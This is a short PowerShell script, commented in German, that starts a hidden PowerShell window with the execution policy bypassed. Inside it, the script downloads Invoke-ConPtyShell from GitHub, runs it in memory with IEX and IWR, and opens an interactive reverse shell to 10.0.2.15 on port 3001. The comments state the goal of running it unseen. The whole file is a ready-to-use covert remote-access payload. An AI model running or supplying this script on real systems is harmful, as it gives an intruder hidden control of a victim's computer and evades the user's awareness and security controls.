# Dieses Skript führt den ConPtyShell-Befehl im Hintergrund aus, ohne ein sichtbares PowerShell-Fenster.

# Definiere den Befehl, der ausgeführt werden soll
$command = "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.2.15 3001"

# Starte einen neuen PowerShell-Prozess im versteckten Modus
# -WindowStyle Hidden: Sorgt dafür, dass kein Fenster angezeigt wird.
# -Command: Führt den angegebenen String als PowerShell-Befehl aus.
# -NonInteractive: Verhindert interaktive Prompts.
# -NoProfile: Lädt keine Benutzerprofile, was den Start beschleunigen kann.
# -ExecutionPolicy Bypass: Umgeht die Ausführungsrichtlinie, um das Skript auszuführen (Vorsicht bei unbekannten Skripten!).
Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NonInteractive", "-NoProfile", "-ExecutionPolicy Bypass", "-Command", $command
